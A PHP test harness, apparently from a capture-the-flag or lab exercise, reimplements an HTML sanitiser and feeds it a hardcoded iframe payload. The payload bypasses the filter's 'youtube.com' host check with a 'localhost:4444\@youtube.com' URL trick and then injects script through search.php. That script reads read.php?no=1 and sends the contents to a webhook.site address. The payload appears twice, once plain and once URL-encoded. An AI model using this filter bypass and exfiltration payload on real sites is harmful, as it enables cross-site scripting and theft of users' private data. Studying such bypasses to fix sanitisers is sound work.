<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
<?php require_once __DIR__ . '/html/libs/htmlParser.php'; ?>
<?php

function filterHtml($content) {
    $result = '';

    $html = new simple_html_dom();
    $html->load($content);
    $allowTag = ['a', 'img', 'p', 'span', 'br', 'hr', 'b', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'strong', 'em', 'code', 'iframe'];

    foreach($allowTag as $tag){
      foreach($html->find($tag) as $element) {
        switch ($tag) {
          case 'a':
            $result .= '<a href="' . str_replace('"', '', $element->href) . '">' . htmlspecialchars($element->innertext) . '</a>';
            break;
          case 'img':
            $result .= '<img src="' . str_replace('"', '', $element->src) . '">' . '</img>';
            break;
          case 'p':
          case 'span':
          case 'b':
          case 'h1':
          case 'h2':
          case 'h3':
          case 'h4':
          case 'h5':
          case 'h6':
          case 'strong':
          case 'em':
          case 'code':
            $result .= '<' . $tag . '>' . htmlspecialchars($element->innertext) . '</' . $tag . '>';
            break;
          case 'iframe':
            $src = $element->src;
            $host = parse_url($src)['host'];
            echo $host ;
            echo "\n";
            if (strpos($host, 'youtube.com') !== false){
              $result .= '<iframe src="'. str_replace('"', '', $src) .'"></iframe>';
            }
            break;
        }
      }
    }

    return $result;
}

$result = ""; 
$content = "<iframe src='http://localhost:4444\@youtube.com/../search.php?text=<script>var xhr = new XMLHttpRequest();xhr.onreadystatechange = function() {if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) { fetch(\"https://webhook.site/401320dc-c380-4768-b6a3-2f8d5a225f0d/?f=\"+xhr.responseText); }}xhr.open(\"GET\", \"http://localhost:4444/read.php?no=1\");xhr.send();</script>'></iframe>";
$content = "<iframe src='http://localhost:4444\@youtube.com/../search.php?text=%3Cscript%3Evar%20xhr%20%3D%20new%20XMLHttpRequest()%3Bxhr.onreadystatechange%20%3D%20function()%20%7Bif(xhr.readyState%20%3D%3D%3D%20XMLHttpRequest.DONE%20%26%26%20xhr.status%20%3D%3D%3D%20200)%20%7B%20fetch(%22https%3A%2F%2Fwebhook.site%2F401320dc-c380-4768-b6a3-2f8d5a225f0d%2F%3Ff%3D%22%2BencodeURIComponent(btoa(xhr.responseText)))%3B%20%7D%7D%3Bxhr.open(%22GET%22%2C%20%22http%3A%2F%2Flocalhost%3A4444%2Fread.php%3Fno%3D1%22%2C%20true)%3Bxhr.send()%3B%3C%2Fscript%3E'></iframe>";

if (strpos($content, '<') !== false) { 
    $result = filterHtml($content);
} else {
    $result = $content;
}

echo $result ; 
?>
<!-- <iframe src='http://www.naver.com'></iframe> -->
</body>
</html>
